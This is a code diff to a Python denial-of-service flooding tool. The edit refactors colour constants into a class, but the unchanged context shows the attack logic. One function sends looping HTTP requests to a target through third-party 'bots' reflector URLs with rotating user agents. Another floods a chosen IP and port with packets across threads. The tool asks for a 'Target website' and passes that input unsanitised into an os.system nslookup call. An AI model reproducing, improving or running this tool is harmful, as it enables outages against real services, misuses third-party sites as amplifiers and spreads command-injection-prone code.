@@ -6,6 +6,19 @@ import os
 from queue import Queue
 import time, socket, threading, urllib.request, random
 
+
+class Colors():
+    GRAY    = '\033[97m'
+    BLACK   = '\033[90m'
+    RED     = '\033[91m'
+    GREEN   = '\033[92m'
+    YELLOW  = '\033[93m'
+    BLUE    = '\033[94m'
+    PINK    = '\033[95m'
+    CYAN    = '\033[96m'
+    END     = '\033[0m'
+
+
 uagent = [
     "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
     "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
@@ -162,11 +175,12 @@ bots = [
     "http://www.facebook.com/sharer/sharer.php?u="]
 
 
+
 def botnet(url):
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print(f"{BLUE}Connecting to a botnet...{END}")
+            print(f"{Colors.BLUE}Connecting to a botnet...{Colors.END}")
             time.sleep(.1)
     except:
         time.sleep(.1)
@@ -180,15 +194,15 @@ def down_it(item):
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
-                print(f"{BLUE}{time.ctime(time.time())} {END}"
-                      f"{GREEN}{i} packet sent to {BLUE}{host} {END}")
+                print(f"{Colors.BLUE}{time.ctime(time.time())} {Colors.END}"
+                      f"{Colors.GREEN}{i} packet sent to {Colors.BLUE}{host} {Colors.END}")
             else:
                 s.shutdown(1)
-                print(f"{RED}<->{END}")
+                print(f"{Colors.RED}<->{Colors.END}")
             time.sleep(.1)
 
     except socket.error as e:
-        print(f"{RED}Error on server! Check the correct IP and Port...{END}")
+        print(f"{Colors.RED}Error on server! Check the correct IP and Port...{Colors.END}")
         print(e)
         time.sleep(.1)
 
@@ -206,25 +220,23 @@ def dos2():
         botnet(random.choice(bots) + "http://" + host)
         w.task_done()
 
-
 if __name__ == '__main__':
-    BLUE, RED, GREEN, YELLOW, CYAN, END = '\033[94m', '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[0m'
 
     web = input("Target website: ")
     print(os.system(f"nslookup {web}"))
 
-    host = input(f"{BLUE}[*] {GREEN}IP Target >>> {END} ")
-    port = int(input(f"{BLUE}[*] {GREEN}PORT >>> {END} "))
-    thr_counts = int(input(f"{BLUE}[*] {GREEN}Counts of threads {GREEN}>>> {END} "))
+    host = input(f"{Colors.BLUE}[*] {Colors.GREEN}IP Target >>> {Colors.END} ")
+    port = int(input(f"{Colors.BLUE}[*] {Colors.GREEN}PORT >>> {Colors.END} "))
+    thr_counts = int(input(f"{Colors.BLUE}[*] {Colors.GREEN}Counts of threads {Colors.GREEN}>>> {Colors.END} "))
 
     os.system("clear")
-    print(f"{GREEN}ip-: {host} -port-: {port} -counts of threads-: {thr_counts} {END}")
-    print(f"{BLUE}Preparing for an attack{END}")
-    print(f"{CYAN} ======D     15% {END}"); time.sleep(.2)
-    print(f"{CYAN} =============D      25% {END}"); time.sleep(.3)
-    print(f"{CYAN} ====================D       50% {END}"); time.sleep(.4)
-    print(f"{CYAN} =============================D        75% {END}"); time.sleep(.3)
-    print(f"{CYAN} =====================================D     100% {END}"); time.sleep(.2)
+    print(f"{Colors.GREEN}ip-: {host} -port-: {port} -counts of threads-: {thr_counts} {Colors.END}")
+    print(f"{Colors.BLUE}Preparing for an attack{Colors.END}")
+    print(f"{Colors.CYAN} ======D     15% {Colors.END}"); time.sleep(.2)
+    print(f"{Colors.CYAN} =============D      25% {Colors.END}"); time.sleep(.3)
+    print(f"{Colors.CYAN} ====================D       50% {Colors.END}"); time.sleep(.4)
+    print(f"{Colors.CYAN} =============================D        75% {Colors.END}"); time.sleep(.3)
+    print(f"{Colors.CYAN} =====================================D     100% {Colors.END}"); time.sleep(.2)
     os.system("clear")
 
     try:
@@ -232,8 +244,8 @@ if __name__ == '__main__':
         s.connect((host, int(port)))
         s.settimeout(1)
     except socket.error as e:
-        print(f"{GREEN}Checking the server IP and port...{END}\n"
-              f"{RED}Error! Check the correct IP and Port..{END}\n")
+        print(f"{Colors.GREEN}Checking the server IP and port...{Colors.END}\n"
+              f"{Colors.RED}Error! Check the correct IP and Port..{Colors.END}\n")
         raise e
 
     i = 0
